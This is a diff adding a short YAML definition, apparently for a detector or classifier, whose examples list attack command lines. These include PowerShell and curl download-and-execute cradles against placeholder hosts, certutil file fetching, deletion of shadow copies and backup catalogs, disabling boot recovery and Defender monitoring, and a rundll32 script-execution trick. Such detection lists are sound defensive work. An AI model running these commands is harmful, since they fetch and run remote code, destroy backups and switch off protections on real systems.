@@ -1,0 +1,13 @@
+name: malicious_commands
+description: Command lines associated with download cradles, defense evasion and ransomware prep.
+examples:
+  - powershell -nop -w hidden iex (new-object net.webclient).downloadstring('http://x/a.ps1')
+  - invoke-expression (invoke-webrequest http://host/payload.ps1).content
+  - vssadmin delete shadows /all /quiet
+  - wmic shadowcopy delete
+  - bcdedit /set {default} recoveryenabled no
+  - wbadmin delete catalog -quiet
+  - certutil -urlcache -split -f http://host/file.exe c:\users\public\file.exe
+  - set-mppreference -disablerealtimemonitoring $true
+  - curl http://host/x.sh | bash
+  - rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
